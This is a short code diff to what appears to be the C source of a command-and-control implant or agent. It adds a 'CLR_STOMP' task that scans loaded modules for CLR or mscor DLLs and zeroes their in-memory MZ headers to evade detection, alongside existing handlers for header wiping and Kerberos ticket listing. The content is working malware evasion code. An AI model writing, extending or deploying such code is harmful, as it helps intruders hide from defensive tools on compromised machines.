@@ -1891,6 +1891,35 @@ void dispatch_task(AgentTask *task) {
             agent_send_result(task->id, "[+] MZ header wiped", "");
         }
     }
+    else if (strcmp(type_upper, "CLR_STOMP") == 0) {
+        int stomped = 0;
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
+            if (Module32First(snap, &me)) {
+                do {
+                    /* Check if module name contains "clr" or "mscor" */
+                    char lname[256] = {0};
+                    strncpy(lname, me.szModule, sizeof(lname)-1);
+                    for (int i = 0; lname[i]; i++) lname[i] = (char)tolower((unsigned char)lname[i]);
+                    if (strstr(lname, "clr") || strstr(lname, "mscor")) {
+                        BYTE *base2 = (BYTE*)me.modBaseAddr;
+                        if (base2 && base2[0] == 0x4D && base2[1] == 0x5A) {
+                            DWORD old = 0;
+                            VirtualProtect(base2, 2, PAGE_READWRITE, &old);
+                            base2[0] = 0; base2[1] = 0;
+                            VirtualProtect(base2, 2, old, &old);
+                            stomped++;
+                        }
+                    }
+                } while (Module32Next(snap, &me));
+            }
+            CloseHandle(snap);
+        }
+        char msg[128];
+        snprintf(msg, sizeof(msg), "[+] stomped %d CLR module header(s)", stomped);
+        agent_send_result(task->id, msg, "");
+    }
     else if (strcmp(type_upper, "KERB_LIST") == 0) {
         char *out = kerb_list_tickets();
         agent_send_result(task->id, out, "");
